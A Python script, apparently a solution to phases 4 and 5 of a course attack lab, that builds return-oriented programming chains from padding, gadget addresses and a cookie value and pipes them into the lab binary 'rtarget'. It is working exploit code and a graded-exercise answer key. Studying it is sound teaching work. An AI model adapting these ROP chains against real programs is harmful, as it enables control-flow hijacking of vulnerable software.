import struct
import hashlib
import os

WORD_SIZE = 8

COOKIE = 0x6eb933c2

GETBUF_STACK_OFFSET = 0x18

Gadgets = {}
with open("Gadgets_Dict.txt", "r") as f:
    G = f.read().splitlines()
    G = [dat.split() for dat in G]
    for hsh, addr in G:
        Gadgets[hsh] = int(addr)


def p64(x: int) -> bytes:
    return struct.pack("<Q", x).ljust(WORD_SIZE, b'\x00')

def byte2hex(x: bytes) -> str:
    string = ""
    for ch in x:
        string += hex(ch)[2:].rjust(2, '0')
    return string

def byte2sphex(x: bytes) -> str:
    string = ""
    for ch in x:
        string += hex(ch)[2:].rjust(2, '0') + ' '
    return string

def cookie_to_hex(x: int) -> bytes:
    return bytes(hex(x)[2:], encoding='ascii')

def find_gadget_addr(x: str) -> int:
    return Gadgets.get(hashlib.sha256(x.encode('ascii')).hexdigest())

### Stage 4
def phase_4():
    TOUCH_2_ADDR = 0x401702

    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')

    Ex += p64(find_gadget_addr("pop rax ; ret"))
    Ex += p64(COOKIE)
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(TOUCH_2_ADDR)

    print(byte2hex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./rtarget")

### Stage 5
def phase_5():
    TOUCH_3_ADDR = 0x4017D6
    ADD_XY_ADDR = 0x4018A1
    
    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(find_gadget_addr("mov rax, rsp ; ret"))
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(find_gadget_addr("pop rsi ; ret"))
    Ex += p64(0x30)
    Ex += p64(ADD_XY_ADDR)
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(TOUCH_3_ADDR)
    Ex += cookie_to_hex(COOKIE)

    print(byte2hex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./rtarget")

phase_4()
phase_5()